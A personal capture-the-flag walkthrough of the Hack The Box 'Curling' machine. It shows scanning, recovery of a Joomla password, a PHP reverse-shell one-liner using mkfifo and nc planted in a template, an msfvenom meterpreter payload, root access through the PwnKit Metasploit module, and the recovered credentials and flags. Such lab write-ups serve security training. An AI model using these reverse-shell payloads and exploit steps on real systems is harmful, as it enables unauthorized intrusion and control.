Curling IP:10.10.10.150


rustscan:
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack


nmap:

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8ad169b490203ea7b65401eb68303aca (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGsat32aGJHTbu0gQU9FYIMlMqF/uiytTZ6lsW+EIodvlPp6Cu5VHfs2iEFd5nfn0s+97qTfJ258lf7Gk3rHrULvCrUif2wThIeW3m4fS5j6O2ZPjv0Gl5g02TItSklwQmjJfyH0KR5b1D9bGCXQV3Gm585DD8wZrOpTxDjGCnmByYoHitfG6sa1LC7Sckb8g9Km40fvfKPPWMHgzUhXC3g3wXyjXXeByZvhjbAAuOv7MKda6MjeNUH71hkiQRkTwZ8qqY9fbDDnSKOHdkC2Scs+8tcpz8AIekc/hmDSn+QKbs+3iV0FLoW9TOPmT8xz45etnqW6DhhlcrO7aFju33
|   256 9f0bc2b20bad8fa14e0bf63379effb43 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN2TI0Uv8Dr/6h+pEZ34kyKx7H6tD1gC/FB4q19PO4klA767pC7YVB3NTdEs2TGI+8XAevVqHiQv/8ZniMwG9IU=
|   256 c12a3544300c5b566a3fa5cc6466d9a9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILhmU6S36IrO41biIUZrXnzMGw3OZmLLHS/DxqKLPkVU
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
|_http-title: Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: Joomla! - Open Source Content Management
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


nikto:



gobuster:


gobuster dir -u http://curling.htb -w /usr/share/wordlists/dirb/common.txt -t 64
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://curling.htb
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/05 14:35:43 Starting gobuster in directory enumeration mode
===============================================================
/administrator        (Status: 301) [Size: 318] [--> http://curling.htb/administrator/]
/bin                  (Status: 301) [Size: 308] [--> http://curling.htb/bin/]
/cache                (Status: 301) [Size: 310] [--> http://curling.htb/cache/]
/.htpasswd            (Status: 403) [Size: 276]
/components           (Status: 301) [Size: 315] [--> http://curling.htb/components/]
/.htaccess            (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/images               (Status: 301) [Size: 311] [--> http://curling.htb/images/]
/includes             (Status: 301) [Size: 313] [--> http://curling.htb/includes/]
/index.php            (Status: 200) [Size: 14263]
/language             (Status: 301) [Size: 313] [--> http://curling.htb/language/]
/layouts              (Status: 301) [Size: 312] [--> http://curling.htb/layouts/]
/libraries            (Status: 301) [Size: 314] [--> http://curling.htb/libraries/]
/media                (Status: 301) [Size: 310] [--> http://curling.htb/media/]
/modules              (Status: 301) [Size: 312] [--> http://curling.htb/modules/]
/plugins              (Status: 301) [Size: 312] [--> http://curling.htb/plugins/]
/server-status        (Status: 403) [Size: 276]
/templates            (Status: 301) [Size: 314] [--> http://curling.htb/templates/]
/tmp                  (Status: 301) [Size: 308] [--> http://curling.htb/tmp/]
Progress: 4427 / 4615 (95.93%)
===============================================================
2023/05/05 14:35:52 Finished
===============================================================


Viewing the source of the website present on port 80, we find some info:

				</div>
							</div>
		</div>
	</div>
	<!-- Footer -->
	<footer class="footer" role="contentinfo">
		<div class="container">
			<hr />
			
			<p class="pull-right">
				<a href="#top" id="back-top">
					Back to Top				</a>
			</p>
			<p>
				&copy; 2023 Cewl Curling site!			</p>
		</div>
	</footer>
	
</body>
      <!-- secret.txt -->
</html>


it appears there is a secret.txt file, lets check it out:
Q3VybGluZzIwMTgh

this string was present in the file. Using cyberchef with magic, we notice that this string is base-64 encoded, and decoded it is: Curling2018!.

Looking over the text that is displayed in the website, we see 1 creator name Super User, but in one of the posts, there is another name : Floris. Using the passowrd above, we manage to log in to index.php. Also, this credentials combination can be used to log in to the joomla administrator page. 

Let's check if we can use this to ssh into the machine: It doesn't work. back to joomla admin panel.

We can get a reverse shell by modding a template. Go to templates(twice), select protostar,From templates we will go to Protostar Details and Files and create a new php file , create a new php file with the following:

<?php
    system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 4444 >/tmp/f');
?>

save the file and open a nc listener on port 4444. After this navigate to: curling.htb/templates/protostar/gabi.php in order to get the shell:

nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.150] 47794
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@curling:/var/www/html/templates/protostar$ 


when we navigate to floris home folder, we cannot read the user flag( as expected):

www-data@curling:/home$ cd floris
cd floris
www-data@curling:/home/floris$ ls
ls
admin-area  password_backup  user.txt
www-data@curling:/home/floris$ cat user.txt
cat user.txt
cat: user.txt: Permission denied


there is another interesting file in the home folder( password_backup)
www-data@curling:/home/floris$ cat password_backup
cat password_backup
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H
www-data@curling:/home/floris$ 


let's download the file to our local machine :


www-data@curling:/home/floris$ python3 -m http.server 8080
python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.14.12 - - [05/May/2023 12:03:25] "GET /password_backup HTTP/1.1" 200 -



wget http://10.10.10.150:8080/password_backup
--2023-05-05 15:03:27--  http://10.10.10.150:8080/password_backup
Connecting to 10.10.10.150:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1076 (1.1K) [application/octet-stream]
Saving to: ‘password_backup’

password_backup                                             100%[========================================================================================================================================>]   1.05K  --.-KB/s    in 0.007s  

2023-05-05 15:03:27 (144 KB/s) - ‘password_backup’ saved [1076/1076]


┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Curling]
└─$ ls
password_backup


after this process, we can read the file:

password_backup

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Curling]
└─$ file bak
bak: bzip2 compressed data, block size = 900k

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Curling]
└─$ bzip3 -d bak 
Command 'bzip3' not found, but can be installed with:
sudo apt install bzip3
Do you want to install it? (N/y)^C
┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Curling]
└─$ bzip2 -d bak 
bzip2: Can't guess original name for bak -- using bak.out

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Curling]
└─$ ls
bak.out  password_backup

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Curling]
└─$ mv bak.out bak.gz

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Curling]
└─$ ls
bak.gz  password_backup

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Curling]
└─$ file bak.gz 
bak.gz: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix, original size modulo 2^32 141

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Curling]
└─$ gzip -d bak.gz 

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Curling]
└─$ ls
bak  password_backup

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Curling]
└─$ file bak 
bak: bzip2 compressed data, block size = 900k

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Curling]
└─$ bzip2 -d bak
bzip2: Can't guess original name for bak -- using bak.out

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Curling]
└─$ file bak.out
bak.out: POSIX tar archive (GNU)

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Curling]
└─$ tar xf bak.out

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Curling]
└─$ cat password
password_backup  password.txt     
┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Curling]
└─$ cat password
password_backup  password.txt     
┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Curling]
└─$ cat password.txt 
5d<wdCbdZu)|hChXll

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Curling]
└─$ 



now I think that we can ssh to the machine. let's try. Now it works:

user flag:
floris@curling:~$ pwd
/home/floris
floris@curling:~$ cat user.txt 
56b4eb06d0fc0235f5558657b4d4e6d2



PRIVESC:

According to linpeas.sh, the target might be vulnerable to pwnkit:


╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main



let's use metasploit in order to get root. first we create a payload using msvenom and we upload it to the target machine. 
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.12 LPORT=9001 -f elf -o shell.bin
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: shell.bin

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Curling]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.10.150 - - [05/May/2023 16:24:56] "GET /shell.bin HTTP/1.1" 200 -



after this we start msfconsole and we use exploit/multi/handler configuret to run with linux/x64/meterpreter/reverse_tcp payload. after we configure the LHOST and the LPORT as the payload config, we run the exploit from msfconsole and then we run the payload on the target machine. After this we will get a meterpreter shell. 
With this shell. we background it and then we use exploit suggester in order to find a root exploit.






 #   Name                                                                Potentially Vulnerable?  Check Result
 -   ----                                                                -----------------------  ------------
 1   exploit/linux/local/cve_2021_3493_overlayfs                         Yes                      The target appears to be vulnerable.
 2   exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec                 Yes                      The target is vulnerable.
 3   exploit/linux/local/cve_2022_0995_watch_queue                       Yes                      The target appears to be vulnerable.
 4   exploit/linux/local/nested_namespace_idmap_limit_priv_esc           Yes                      The target appears to be vulnerable.
 5   exploit/linux/local/pkexec                                          Yes                      The service is running, but could not be validated.
 6   exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.
 7   exploit/linux/local/sudo_baron_samedit                              Yes                      The target appears to be vulnerable. sudo 1.8.21.2 is a vulnerable build.





we use the   exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec   to get root access:
meterpreter > cat /root/root.txt
591c7f9ed90afc10da46bc0240d24465
